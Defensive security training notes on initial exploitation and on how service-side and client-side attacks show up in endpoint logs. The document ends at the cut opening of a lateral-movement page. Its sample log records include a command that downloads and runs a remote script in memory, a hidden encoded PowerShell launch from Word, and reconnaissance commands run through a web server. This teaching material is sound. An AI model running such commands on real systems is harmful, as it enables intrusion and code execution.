docs.title: Initial Exploitation — Why the Endpoint Matters, Delivery, Service-Side and Client-Side Exploits
Initial Exploitation — Why the Endpoint Matters, Delivery, Service-Side and Client-Side Exploits
docs.text:
What this page covers

Why most of an intrusion — exploitation, execution, persistence, discovery, privilege escalation, lateral movement and data theft — is best seen from the endpoint, and what the endpoint can tell you that the network can't (which process, which user, what went into the encrypted tunnel). Where the network-centric delivery stage ends and the host-centric part of the attack begins. The single most important idea of initial exploitation: the attacker becomes the process or user they compromised — so the first question is always "what was compromised, and with what privileges?" Then the two families of exploit — service-side (attacker connects to a listening port) and client-side (the victim opens a file or visits a site) — how each works, why attackers prefer one over the other, what each leaves in netstat/ss, 4688, Sysmon 1 and 3, IIS and Mark-of-the-Web records, and how that changes your triage. Practice questions with explanations at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs, hashes and file names are invented for illustration (.example, documentation and private IPs).

docs.title: The 8 key points
docs.text:
1. The network shows protocols, domains and destinations. The endpoint shows which process made the traffic, which user ran it, and what it did — the facts that tie an investigation together. Most attack stages after delivery are best investigated with endpoint data.
  2. In kill-chain terms, recon and weaponisation happen on the attacker's side and delivery is mostly network-centric. From exploitation onwards the action moves onto the host.
  3. Initial access comes in three forms: a technical exploit, social engineering (the user runs it for you), or simply logging in with stolen credentials. The third one needs no exploit at all.
  4. After a successful exploit the attacker becomes the compromised process or user and can do anything it can do — no more, no less. So always ask: what was compromised, and what privileges did it have?
  5. A service running as a limited account limits the damage; a process running as the user gives user rights; a service running as root/SYSTEM gives everything. This is why least privilege, for services and for people, matters so much.
  6. Service-side exploits need a reachable, listening port (web, SMB, RDP, VNC, and many desktop applications). They need no user interaction, can be retried and re-used, and so may let the attacker skip persistence — but a firewall block stops them.
  7. Client-side exploits need the user to act (open a document, click a link, visit a site). They work through firewalls because the victim reaches out, but they are hard to repeat, so attackers who use them are more likely to install persistence.
  8. The exploit type shapes the evidence: service-side → a server process spawning something it never should (w3wp.exe → cmd.exe); client-side → a user application spawning a shell or script host (WINWORD.EXE → powershell.exe), usually with a downloaded file carrying Mark of the Web.

docs.title: Why the endpoint has the better view
The two vantage points
docs.text:
Every intrusion touches both the network and the endpoints, and both keep artefacts. But they answer different questions. Think of a burglary in an office tower. The lobby camera (network sensor) sees someone enter the building at 02:10 and leave at 02:55 carrying a bag. Useful — but it can't tell you which office they went into, which drawer they opened, or what is in the bag. The camera inside the office (endpoint telemetry) shows exactly that.

Technically, here is the same moment from both sides. A Zeek conn.log line from the network sensor:

ts=2026-11-17T02:10:44Z uid=C8yKq21 id.orig_h=10.20.30.41 id.orig_p=51877 id.resp_h=203.0.113.88 id.resp_p=443 proto=tcp service=ssl duration=2640.1 orig_bytes=184220311 resp_bytes=91233 conn_state=SF
  • id.orig_h=10.20.30.41 → id.resp_h=203.0.113.88:443 — an internal host talked to an internet host on 443.
  • service=ssl — it was TLS; the content is encrypted.
  • duration=2640.1 — about 44 minutes.
  • orig_bytes=184220311 — the internal host sent ~184 MB, the server replied with only ~91 KB. Something big went out.

That's all the network can say: who to whom, how long, how much. Now the endpoint — Sysmon event ID 3 (network connection) from the same laptop:

Event ID: 3   Network connection detected
UtcTime:          2026-11-17 02:10:44.312
ProcessGuid:      {6c1f2a30-8b11-6735-4a02-000000002a00}
ProcessId:        7316
Image:            C:\Users\j.kim\AppData\Local\Temp\rclone-x64.exe
User:             CORP\j.kim
Protocol:         tcp
SourceIp:         10.20.30.41
SourcePort:       51877
DestinationIp:    203.0.113.88
DestinationPort:  443
DestinationHostname: store.files-share.example
  • Image — the process that made the connection: a file-sync tool running from a Temp folder, not from Program Files. That alone is suspicious.
  • User — which account it ran as: CORP\j.kim.
  • ProcessId/ProcessGuid — the key to pivot into the process-creation event (Sysmon 1 / 4688) and see who started it and with what command line — and there you would likely find the folder it was told to copy, i.e. what went into the encrypted tunnel.
  • SourcePort 51877 matches the Zeek line — that's how you join the two sources.

The network told you that 184 MB left. The endpoint told you who, with what, and (via the command line) what. That's the whole argument of this section.

docs.title: Which attack stages live on the endpoint
docs.text:
Stage ATT&CK tactic Best evidence Why the network alone falls short Exploitation / initial access Initial Access (TA0001) Process creation from a server or user application, crash events, EDR alerts The exploit may be inside TLS, or arrive as a file with no network at all Code execution Execution (TA0002) 4688 / Sysmon 1 with command line, PowerShell 4104 Runs in memory and on disk, not on the wire Persistence Persistence (TA0003) Services (7045), scheduled tasks (4698), Run keys (Sysmon 13), new accounts Created locally; no traffic until it fires Discovery of accounts, files, privileges Discovery (TA0007) whoami, net, nltest processes; LDAP queries in DC logs Much of it is local commands Privilege escalation Privilege Escalation (TA0004) Token elevation in 4688, new SYSTEM processes, exploit crashes Entirely on the host Lateral movement Lateral Movement (TA0008) 4624 type 3/10 on the target, 7045, 5145 The network sees the connection, but not whose credentials or what ran Collection and staging for exfiltration Collection (TA0009), Exfiltration (TA0010) Archive tools, mass file reads, process ↔ connection link The network sees bytes leave, not which files

The rest of this section walks through those stages one by one. The endpoint-defence section after it covers the tools that catch them.

docs.title: Where delivery ends and the host takes over
docs.text:
The classic Cyber Kill Chain has seven steps: Recon → Weaponisation → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives.

  • Recon (scanning, reading the company website, collecting e-mail addresses) and weaponisation (building the malicious document or exploit) happen on the attacker's own machines. You usually only see recon if they scan you.
  • Delivery is mostly network-centric: an e-mail attachment, a link to a compromised or malicious website, or — inside the network — a connection from one internal host to another. That was the subject of the network part (DNS, HTTP, e-mail, other protocols).
  • From exploitation onwards, the attacker is acting on a host: code runs, files appear, accounts are used. This page starts exactly there and assumes delivery has succeeded.

[Supplement] Kill chain vs ATT&CK

The kill chain is a good mental timeline, but SOCs label activity with MITRE ATT&CK tactics and techniques because they are far more specific. A rough mapping: Delivery + Exploitation ≈ Initial Access and Execution; Installation ≈ Persistence; C2 ≈ Command and Control; Actions on Objectives ≈ Collection, Exfiltration, Impact. ATT&CK also adds what the kill chain hides inside "actions": Discovery, Privilege Escalation, Credential Access, Lateral Movement.

docs.title: Three doors into a host
docs.text:
"Exploitation" in the broad sense — the moment the attacker first runs code or acts on your host — happens in three ways:

Door What happens Typical ATT&CK Technical exploit A bug (buffer overflow, deserialisation, injection) in a program is triggered so it runs the attacker's code T1190 Exploit Public-Facing Application, T1210 Exploitation of Remote Services, T1203 Exploitation for Client Execution Social engineering No bug needed: the user is persuaded to run the attacker's code (macro, script, "paste this to fix the error") T1566 Phishing, T1204 User Execution Valid credentials The attacker simply logs in with a stolen or guessed password, token or key T1078 Valid Accounts, T1133 External Remote Services

The third door is easy to forget because there is no "exploit" in it, yet in real incident data stolen credentials are consistently one of the top ways in. To the logs it looks like a normal login — which is why the login events covered later in these notes matter so much.

docs.title: The attacker becomes the process
docs.text:
Here is the core idea. When an exploit succeeds against a program, the attacker's code runs inside that program, with exactly that program's identity and permissions — no more, no less. A film analogy: in a body-swap movie the intruder takes over one person's body. They can open every door that person's keycard opens — and only those doors. If they took over the night cleaner, they can enter offices but not the vault. If they took over the bank manager, the vault is open.

Technically, every Windows process carries an access token (user SID, group SIDs, privileges, integrity level); every Linux process has a UID/GID and capabilities. Exploit code inherits that token or UID. So the first triage question is always:

What was compromised — and what could it already do?

Compromised thing Runs as What the attacker gets immediately A web app pool with a virtual account IIS APPPOOL\ShopSite (low rights) Read the site's files, maybe its database connection string — little else without escalating A PDF reader or browser opened by a normal user CORP\j.kim, medium integrity Everything j.kim can do: her files, mail, shares, VPN, SaaS sessions The same app opened by a user who is a local administrator Admin token (after UAC) Install software and services, disable defences, dump credentials from memory A service running as SYSTEM / a daemon running as root NT AUTHORITY\SYSTEM / uid=0 The whole machine, instantly

This is the reason behind two rules every admin grumbles about:

  • Run services with the least privilege possible. A dedicated low-rights service account (or a Windows virtual/managed service account, or a Linux user like www-data) turns a successful exploit into a small problem instead of a full compromise. A web server running as root is a gift.
  • Users should not be local administrators. Users dislike not being able to install things, but if a phishing document runs with an admin token, the code can install anything, switch off protection, and — on Windows especially — read password material out of memory, which is how one infected PC becomes a domain compromise (covered in the credential-dumping page of this section).

docs.title: How an analyst checks "what was compromised"
docs.text:
On Windows, the User and integrity of every running process:

Get-Process -IncludeUserName | Where-Object ProcessName -in 'w3wp','WINWORD','cmd','powershell' |
    Format-Table Id, ProcessName, UserName -AutoSize
  • Get-Process -IncludeUserName — lists processes and adds the account each runs as (needs an elevated prompt).
  • Where-Object ProcessName -in … — keeps only the processes we care about.
  • Format-Table … -AutoSize — prints a compact table.

Output:

   Id ProcessName UserName
   -- ----------- --------
 4120 w3wp        IIS APPPOOL\ShopSite
 6604 cmd         IIS APPPOOL\ShopSite
 8812 WINWORD     CORP\j.kim
 9020 powershell  CORP\j.kim

Reading it: cmd (PID 6604) runs as the app pool account — a command shell running as a web site identity is a classic sign of web exploitation (we'll see the event for it below). powershell runs as j.kim, like her Word — if Word started it, that's client-side.

On Linux, the same question with ps:

ps -eo user,pid,ppid,cmd --forest | grep -B2 -A2 '/bin/sh'
  • ps -e — every process; -o user,pid,ppid,cmd — show the owner, PID, parent PID and full command.
  • --forest — draw the parent/child tree.
  • grep -B2 -A2 '/bin/sh' — show shells with two lines of context.
www-data   1882   1101  \_ php-fpm: pool www
www-data  24417   1882      \_ sh -c id; uname -a
www-data  24418  24417          \_ uname -a

A PHP worker (php-fpm, running as www-data) spawned sh running id; uname -a — the attacker's first "who am I and where am I" commands. Because it is www-data, not root, the damage is (for now) limited to what the web user can touch.

docs.title: How they work
docs.text:
A service-side exploit is the attacker connecting to a program that is listening on a port and sending it input crafted to trigger a bug. The attacker initiates: SYN → SYN/ACK → ACK → the malicious request.

Analogy: a shop with a service window onto the street. Anyone walking by can push a note through the window at any time, and if the clerk follows a cleverly written note ("open the safe and pass me the contents"), the shop is robbed — no customer needs to be fooled, and the robber can come back every night and try again. Brick up the window (firewall) and the trick is impossible.

Key properties:

  • Requires an accessible, listening port. No listener, or a firewall in the way → no exploit.
  • Not only servers. Workstations listen too: SMB (445), RDP (3389), WinRM, sometimes VNC, plus many applications — remote-support tools, virtualisation software, development web servers, printer and media-sharing agents.
  • No user interaction. The user notices nothing, so the attacker can try repeatedly and re-exploit at will. A careful attacker who knows the hole is still open may skip persistence entirely (persistence is something defenders can find), and simply come back through the same hole.
  • Stopped by a firewall or by patching. It is ultimately a software quality problem in that listening program.
  • Location matters. A laptop's listening service may be unreachable behind the corporate firewall, but exploitable on a shared coffee-shop or hotel Wi-Fi, where the attacker is on the same network.

Relevant ATT&CK: T1190 Exploit Public-Facing Application (internet-facing web apps, VPNs, firewalls, mail servers), T1210 Exploitation of Remote Services (internal services, typically for lateral movement), T1133 External Remote Services (exposed VPN/RDP/Citrix used with valid credentials).

docs.title: Find what is listening — the attack surface
docs.text:
You can't defend ports you don't know about. On Windows:

Get-NetTCPConnection -State Listen |
    Select-Object LocalAddress, LocalPort, OwningProcess,
        @{n='Process';e={(Get-Process -Id $_.OwningProcess).ProcessName}} |
    Sort-Object LocalPort
  • Get-NetTCPConnection -State Listen — only sockets waiting for incoming connections.
  • Select-Object … — the local address/port, the owning PID, and a calculated column that turns the PID into a process name.
  • Sort-Object LocalPort — order by port.
LocalAddress LocalPort OwningProcess Process
------------ --------- ------------- -------
0.0.0.0            135          1048 svchost
0.0.0.0            445             4 System
0.0.0.0           3389          1312 svchost
127.0.0.1         5939          3876 RemoteSupportAgent
0.0.0.0           8080          5544 node
0.0.0.0           5900          6120 tvnserver

Reading it line by line:

  • 0.0.0.0 means "listening on all interfaces" — reachable from the network if the firewall allows. 127.0.0.1 means local only — not remotely exploitable.
  • 135 (RPC) and 445 (SMB, owned by the kernel System, PID 4) — normal on Windows; must not be reachable from the internet, and ideally not between workstations.
  • 3389 — RDP is on. Is it supposed to be on this laptop?
  • 5939 on loopback — a remote-support agent; local only, fine for now.
  • 8080 owned by node on all interfaces — a developer's test web server reachable from the network. Classic forgotten attack surface.
  • 5900 tvnserver — a VNC server. Usually unexpected and worth a question.

The classic one-liner netstat -ano | findstr LISTENING shows the same (-a all, -n numeric, -o owning PID). On Linux:

sudo ss -tlnp
  • -t TCP, -l listening, -n numeric ports, -p show the process (needs root).
State   Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
LISTEN  0      128          0.0.0.0:22         0.0.0.0:*     users:(("sshd",pid=901,fd=3))
LISTEN  0      511          0.0.0.0:80         0.0.0.0:*     users:(("nginx",pid=1101,fd=6))
LISTEN  0      80         127.0.0.1:3306       0.0.0.0:*     users:(("mariadbd",pid=1204,fd=21))

SSH and the web server are network-reachable; the database listens on loopback only — exactly how it should be.

docs.title: What a service-side exploit looks like in the logs
docs.text:
Scenario: an attacker exploits a bug in a web application on IIS server SRV-WEB-0002. The web log (IIS W3C format) shows the request:

2026-11-18 03:12:09 10.20.50.12 POST /shop/api/import.aspx - 443 - 198.51.100.23 Mozilla/5.0+(compatible) - 200 0 0 1873
  • 2026-11-18 03:12:09 — date and time (IIS logs in UTC by default).
  • 10.20.50.12 — the server's own IP.
  • POST /shop/api/import.aspx — the method and path. A POST to an import/upload endpoint is a typical exploit target.
  • - — no query string; the payload is in the body, which IIS does not log. That's why web logs alone rarely prove an exploit.
  • 443 — server port.
  • - — no authenticated user name.
  • 198.51.100.23 — the client (attacker) IP.
  • Mozilla/5.0+(compatible) — a vague user agent (spaces are written as +).
  • 200 0 0 — HTTP status 200 (success), substatus, Win32 status.
  • 1873 — time taken in ms; unusually long for a simple API call.

The decisive evidence is on the host. Event 4688 — "A new process has been created" — fires every time a process starts, if Audit Process Creation is enabled (and the command line is included only if the separate "Include command line in process creation events" policy is on). Attackers care because everything they do after exploitation spawns processes; this event is often the first and best record of their hands on the keyboard.

<Event>
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-11-18T03:12:10.0412Z"/>
    <Computer>SRV-WEB-0002.corp.example</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">SRV-WEB-0002$</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="NewProcessId">0x19cc</Data>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="TokenElevationType">%%1936</Data>
    <Data Name="ProcessId">0x1018</Data>
    <Data Name="CommandLine">cmd.exe /c whoami && ipconfig /all</Data>
    <Data Name="TargetUserName">ShopSite</Data>
    <Data Name="TargetDomainName">IIS APPPOOL</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\inetsrv\w3wp.exe</Data>
    <Data Name="MandatoryLabel">S-1-16-8192</Data>
  </EventData>
</Event>
  • TimeCreated — one second after the POST. Timing links the two logs.
  • SubjectUserName = SRV-WEB-0002$ — the account that created the process from the system's point of view; for service processes this is often the machine account. Don't confuse it with the identity the new process runs as.
  • NewProcessName = …\cmd.exe — a command shell was started.
  • CommandLine = cmd.exe /c whoami && ipconfig /all — run two commands and exit (/c). && is just XML escaping for &&. whoami + ipconfig is the classic "who am I, where am I" opening move.
  • TargetUserName/TargetDomainName = IIS APPPOOL\ShopSite — the identity the new process runs as: the app pool's virtual account. This answers "what was compromised": a low-rights web identity.
  • ParentProcessName = …\inetsrv\w3wp.exe — the IIS worker process is the parent. w3wp.exe should essentially never start cmd.exe or powershell.exe; this parent/child pair is one of the most reliable web-exploitation (or web-shell) signals there is.
  • TokenElevationType = %%1936 — "Type 1", a full token with UAC not applicable (normal for service accounts). %%1937 = elevated (Type 2), %%1938 = limited (Type 3, a normal user under UAC).
  • MandatoryLabel = S-1-16-8192 — medium integrity. (S-1-16-12288 = high, S-1-16-16384 = system.)
  • ProcessId 0x1018 — the parent's PID (4120 decimal; matches the w3wp row in the earlier table).

A network IDS might add an alert for the request pattern, but the 4688 tells you it worked.

docs.title: How they work
docs.text:
In a client-side attack the victim's program does the reaching: the user opens a file, clicks a link, or browses to a page, and the client software (browser, PDF reader, Office, an archive tool, a chat app) processes attacker-controlled content. Either a bug in that client is triggered (a true exploit), or — far more common today — the content simply persuades the user to run something.

Analogy: instead of pushing a note through the shop window, the robber mails the clerk a parcel. The clerk has to choose to open it — and once opened, it acts with the clerk's hands. You can't brick up a window against it, because the clerk carried the parcel inside themselves. But you also can't make the clerk open a second identical parcel tomorrow; they'll be suspicious.

Key properties:

  • Doesn't necessarily need network traffic at exploit time — a malicious file can arrive on a USB stick or a file share. Browser exploits do need the victim to visit an attacker-controlled (or compromised) site.
  • Needs user interaction: "open this invoice", "click this link to view the shared document".
  • Defeats inbound firewalls: the victim initiates the connection, outbound, so "nothing can get in" is no protection.
  • Hard to repeat on the same person: you can't reliably make someone open documents on demand, and repeated attempts raise suspicion. So attackers using client-side access are more likely to install persistence straight away.
  • Sometimes the only option: a well-firewalled organisation with patched internet-facing services may leave the attacker nothing but the users.

Relevant ATT&CK: T1566 Phishing (.001 attachment, .002 link), T1189 Drive-by Compromise, T1203 Exploitation for Client Execution, T1204 User Execution (.001 malicious link, .002 malicious file, .004 malicious copy and paste).

docs.title: What a client-side compromise looks like in the logs
docs.text:
Scenario: j.kim on LT-HR-0233 opens Invoice_8841.docm from an e-mail. First, the file carries Mark of the Web (MotW) — an alternate data stream that Windows adds to files downloaded from the internet (by browsers and most mail clients):

Get-Content 'C:\Users\j.kim\Downloads\Invoice_8841.docm' -Stream Zone.Identifier
  • -Stream Zone.Identifier — read the hidden NTFS alternate data stream of that name instead of the file's main content.
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://mail.corp.example/
HostUrl=https://files.invoice-portal.example/dl/Invoice_8841.docm
  • ZoneId=3 — the Internet zone (0 local machine, 1 intranet, 2 trusted, 3 internet, 4 restricted). Office and Windows SmartScreen use this to apply protections (Protected View, macro blocking).
  • ReferrerUrl — the page the download came from (webmail).
  • HostUrl — where the file was actually downloaded from. A pivot for your proxy and DNS logs.

Then the process tree. Sysmon event ID 1 (process creation — like 4688 but with hashes, parent command line and a GUID):

Event ID: 1   Process Create
UtcTime:            2026-11-18 07:41:58.903
ProcessGuid:        {6c1f2a30-a7e6-673a-1c03-000000002b00}
ProcessId:          9020
Image:              C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
OriginalFileName:   PowerShell.EXE
CommandLine:        powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
CurrentDirectory:   C:\Users\j.kim\Documents\
User:               CORP\j.kim
IntegrityLevel:     Medium
Hashes:             SHA256=3F1A...C09B
ParentProcessId:    8812
ParentImage:        C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine:  "WINWORD.EXE" /n "C:\Users\j.kim\Downloads\Invoice_8841.docm"
  • Image / OriginalFileName — PowerShell. OriginalFileName comes from the file's version resource, so it still says PowerShell even if the attacker renamed the binary.
  • CommandLine — -nop (no profile), -w hidden (hidden window), -enc (a Base64-encoded command follows). Hidden + encoded is a strong malicious indicator; decode it (it's UTF-16LE Base64) to read the real command.
  • User CORP\j.kim, IntegrityLevel Medium — the code runs as j.kim with a normal user token: it has her rights, not admin rights. Good news for scope — unless j.kim is a local admin.
  • ParentImage WINWORD.EXE + ParentCommandLine naming a .docm from Downloads — Word, opening a macro-enabled document from the internet, started a hidden PowerShell. Office applications launching shells, script hosts (wscript, cscript, mshta) or rundll32/regsvr32 is the classic client-side signal.
  • Hashes — for reputation checks and for hunting the same payload elsewhere.

Next, Sysmon 3 for PID 9020 would show where that PowerShell connected (the stage-two download or C2), and Sysmon 11 (file create) what it dropped.

docs.title: Service-side vs client-side at a glance
docs.text: Service-side Client-side Who starts the connection Attacker → victim's listening port Victim → attacker's site / file opened locally User interaction None Required (open, click, visit, paste) Stopped by inbound firewall Yes No Repeatable Yes — re-exploit at will Hard — depends on fooling the user again Persistence likely? May be skipped if the hole stays open Likely, installed early Typical parent → child w3wp.exe, httpd, java, sqlservr.exe, spoolsv.exe → shell WINWORD.EXE, EXCEL.EXE, AcroRd32.exe, browser, explorer.exe → shell/script host Runs as The service's account (ideally low-rights; sometimes SYSTEM/root) The logged-on user First fix Patch, close or firewall the port User training, macro/attachment controls, attack-surface reduction rules, EDR

docs.title: Triage checklist for a suspected exploitation
docs.text:
1. What was compromised? The parent process (server or client app) and the account the child runs as (TargetUserName in 4688, User in Sysmon 1).
  2. What privileges does it have? Low-rights service, normal user, local admin, SYSTEM/root? That sets the urgency and the scope of credential resets.
  3. Service-side or client-side? Listening service with inbound traffic, or a user application that opened a file/URL? This tells you whether the hole is still open (patch/block now) and whether to expect persistence (hunt for it now).
  4. What happened next? Child processes, network connections (Sysmon 3), files written (Sysmon 11), new services/tasks/accounts.
  5. Where else? The same exploit request against other servers, or the same attachment/URL delivered to other users.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

Everything above still holds. The endpoint remains the place where process, user and intent come together, and modern EDR is built on exactly the process-tree and process-to-network linking shown here. "The attacker becomes the compromised process" is still the right first triage question, and least privilege for services and users is still the cheapest damage limiter. Both exploit families are alive. In fact service-side exploitation has become more important, not less: the 2026 Verizon DBIR reports that exploitation of vulnerabilities has overtaken stolen credentials as the leading initial access vector for the first time, and Mandiant's M-Trends 2026 again ranks exploits first — with voice phishing now second.

[Changed] What has changed

  • The service-side target moved to the edge. The listening services attackers exploit most are now internet-facing edge devices — VPN gateways, firewalls, remote-access and file-transfer appliances — many of which run no EDR at all, so the "endpoint view" is missing exactly where entry happens. Their own logs and network telemetry become critical.
  • Speed. M-Trends 2026 reports that the median time between an initial-access group getting in and handing access to the next group (often ransomware) has shrunk to seconds (22 s in their data), so detection has to work on the first process tree, not the next day.
  • Client-side moved away from macros. Since 2022 Office blocks VBA macros in files carrying Mark of the Web by default, so attackers shifted to containers (ISO/IMG/ZIP to drop MotW), shortcut (.lnk), HTML smuggling, OneNote, and above all "paste-and-run" lures (ClickFix): a fake CAPTCHA or error page tells the user to press Win+R and paste a command. ATT&CK added T1204.004 Malicious Copy and Paste for this in 2025. The signal is explorer.exe (Run dialog) → powershell.exe/mshta.exe, and the RunMRU registry key.
  • Identity is a door of its own. Help-desk and voice phishing, MFA fatigue, session-token theft and OAuth consent abuse mean "valid credentials" increasingly arrive in cloud identity logs (Entra ID / Okta sign-ins) rather than on a Windows host.
  • Sysmon is becoming built in. During 2026 Microsoft began shipping Sysmon as an optional Windows 11 / Server 2025 feature (off until you enable it and give it a configuration), instead of only a separate download — making the Sysmon 1/3 events shown here easier to deploy.

[Caution] Where the old way is wrong or risky today

  • "Service-side exploits are becoming rare" is no longer true for internet-facing systems. Treat every exposed VPN, firewall management interface and file-transfer server as a priority patch target and monitor it as if it were a server under attack.
  • Don't trust "the firewall blocks inbound, we're safe". Client-side attacks, ClickFix and stolen credentials all come in through outbound or legitimate channels.
  • Don't rely on the web log to prove or disprove an exploit. POST bodies aren't logged and many exploits hit 200 OK pages. Look for the process the server spawned.
  • Don't assume cmd.exe/powershell.exe are the only children to worry about. Attackers use rundll32, mshta, certutil, bitsadmin, renamed binaries and in-memory execution; match on parent process and OriginalFileName, not just names.
  • 4688 without the command line is half blind. Make sure the "Include command line in process creation events" policy is on (or deploy Sysmon / EDR).

docs.title: Question 1
docs.text:
A 4688 on SRV-APP-0007 shows ParentProcessName = C:\Program Files\Java\jre\bin\java.exe, NewProcessName = C:\Windows\System32\cmd.exe, CommandLine = cmd.exe /c powershell -c "iwr http://203.0.113.50/a.ps1 | iex", TargetUserName = SYSTEM. Is this service-side or client-side, what was compromised, how bad is it, and what do you do first?

Answer and explanation

Service-side. java.exe on an application server is a long-running service (an app server listening on a port), not a user opening a document. A Java application spawning cmd.exe, which runs PowerShell to download (iwr) and execute in memory (iex) a script from an internet IP, is a classic post-exploitation pattern for a public-facing app exploit (T1190).

What was compromised and how bad: the Java service, and it runs as SYSTEM — so the attacker has full control of the server from the first second. No privilege escalation needed. This is the "webserver running as root" case.

First steps: isolate the host (EDR network containment) because SYSTEM access means credentials on the box are exposed; find the inbound request in the app/web logs and the vulnerable component, and patch or block it (otherwise the attacker can simply re-exploit); pivot on 203.0.113.50 in proxy/DNS/firewall logs for other victims; check for persistence even though service-side attackers may skip it; and fix the service to run under a low-rights account.

docs.title: Question 2
docs.text:
Explain why an attacker who got in through a phishing attachment is more likely to create persistence quickly than an attacker who got in through an unpatched VPN appliance. What does that mean for your hunt?

Answer and explanation

The phishing attacker's access depends on a user choosing to open a file. If the machine reboots, the user logs off or the process dies, access is gone, and there's no reliable way to make the same person open another malicious document — repeated attempts also raise suspicion. So they secure a way back immediately: a scheduled task, a Run key, a service, a new account.

The VPN-appliance attacker can re-exploit at will, with no user involved and nobody noticing. Persistence is optional for them and even risky (it is something defenders can find), so they may rely on the hole itself.

For the hunt: after a client-side compromise, look hard for persistence on that host (tasks, services, Run keys, WMI subscriptions). After a service-side compromise, don't take "no persistence found" as "clean" — patching or blocking the hole is the containment, and you also hunt for credentials or web shells they may have taken or left.

docs.title: Question 3
docs.text:
Get-NetTCPConnection -State Listen on a user laptop shows 0.0.0.0:8080 owned by node and 127.0.0.1:5939 owned by a remote-support agent. Which one is a service-side attack surface, why, and under what circumstances could it be exploited even though the corporate firewall blocks inbound traffic?

Answer and explanation

0.0.0.0:8080 (node) is the attack surface: 0.0.0.0 means it listens on all interfaces, so anything that can reach the laptop's IP can send it requests. 127.0.0.1:5939 listens on loopback only and can't be reached from the network (it could matter only to code already running on the laptop).

Even with inbound traffic blocked at the corporate perimeter, the node server can be hit by: other internal hosts (an attacker who already owns one machine on the same network — lateral movement, T1210), and anyone on the same network when the laptop is outside — hotel or coffee-shop Wi-Fi, a home network with a compromised device. That's why the host firewall on the laptop itself matters, and why forgotten developer servers should bind to 127.0.0.1 or be removed.

docs.title: Lateral Movement, Collection and Exfiltration — From One Foothold to Data Out the Door
Lateral Movement, Collection and Exfiltration — From One Foothold to Data Out the Door
docs.text:
What this page covers

The last stretch of an intrusion. The first compromised machine is almost never where the valuable data lives, so the attacker moves laterally: they need two things on every new host — a way in (an exploit or, far more often, stolen credentials) and code to run there (built-in tools or malware they staged). We go through the remote-administration protocols they borrow (SMB with PsExec-style services, WMI, PowerShell remoting, SSH, RDP, VNC) and the exact events each one leaves on the target host. Then collection — searching files and shares, email, databases, screen capture and keylogging — and why lateral movement, privilege escalation and collection repeat in a loop. Then exfiltration, which is harder than it sounds: gigabytes have to leave a network that (ideally) blocks servers from talking to the internet, so the data is staged on a host that can get out, compressed, encrypted, split into pieces, and leaked slowly through whatever port is allowed. Every sample (4624 type 3 with 5145 ADMIN$ and 7045 for a remote service, WmiPrvSE.exe and wsmprovhost.exe children, RDP 1149 and type 10, an SSH auth.log line, a share-access burst, a 7z command line, firewall denies, a Zeek conn.log upload, a slow cloud-sync command line) is broken down field by field. We finish with a summary of the whole endpoint-attack section and practice questions.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs and file names are invented for illustration (.example, documentation and private IPs).

docs.title: The 8 key points
docs.text:
1. Attackers rarely land on their goal. The data they want sits deep inside, reachable only by privileged accounts, so they use the first host as a foothold and hop from machine to machine. That is Lateral Movement (TA0008).
  2. Every hop needs two ingredients: access to the next host (an exploit — T1210 — or, much more commonly, valid stolen credentials — T1078) and code to run there (built-in OS tools need nothing; custom malware has to be copied over or put on a share first — T1570 Lateral Tool Transfer).
  3. The attacker uses the same remote-administration protocols your admins use — SMB with a remote service (PsExec style), WMI, PowerShell remoting/WinRM, SSH on the command line; RDP, VNC or X11 forwarding for a GUI. These map to T1021 Remote Services (and T1047 for WMI). The protocol is legitimate; who, from where, and to where is what's suspicious.
  4. The best place to see lateral movement is the target host: a network logon (4624 type 3) or RDP logon (type 10), followed within seconds by a tell-tale parent process (services.exe, WmiPrvSE.exe, wsmprovhost.exe) starting a shell — plus a new service (7045) for PsExec-style tools.
  5. Collection (TA0009) happens on every host reached: local and shared files, email, databases, screenshots, keystrokes — then copying what matters into a staging folder (T1074 Data Staged). Lateral movement, privilege escalation and collection repeat as a cycle until the attacker reaches what they came for.
  6. Exfiltration (TA0010) is the hard part for the attacker: lots of data, servers that can't reach the internet, an outbound firewall to get through, and monitoring to avoid. So they stage the data on a host that can get out, compress, encrypt and split it (T1560.001), and send it slowly in small pieces (T1030, T1029).
  7. Encryption hides what was stolen even from full packet capture — so the command line of the archiving tool (process creation logging) may be the only record of which files left, and sometimes it even contains the password.
  8. On a well-run network with default-deny outbound, the attacker usually trips firewall deny logs while looking for a way out, and then has to use the expected protocol on an allowed port (HTTPS through the proxy). Detection then depends on the destination and the volume and timing of uploads.

docs.title: Why the first host is rarely enough
docs.text:
Think of a burglar who gets into a large office building through a ground-floor window. The safe is on the twelfth floor, in a room that needs a manager's badge. The window got them in, but they still have to walk the corridors, borrow badges and take the lift before they reach anything worth stealing.

A targeted intrusion works the same way. The first victim is usually whoever opened the phishing email or whichever internet-facing server had the bug — a normal user's laptop, a web server in the DMZ. The real targets — the finance file server, the customer database, the domain controller, the backup system — sit deeper inside and are reachable only with privileged accounts. So the attacker keeps the first host as a foothold and uses it to reach the next machine, and the next, picking up credentials and privileges along the way. ATT&CK calls this Lateral Movement (TA0008).

That is also why the previous pages matter here: privilege escalation gives admin on one host, credential dumping turns that into other people's accounts, and lateral movement spends those accounts on new hosts.

docs.title: The two ingredients: access and code
docs.text:
To do anything on a remote machine, the attacker needs two separate things:

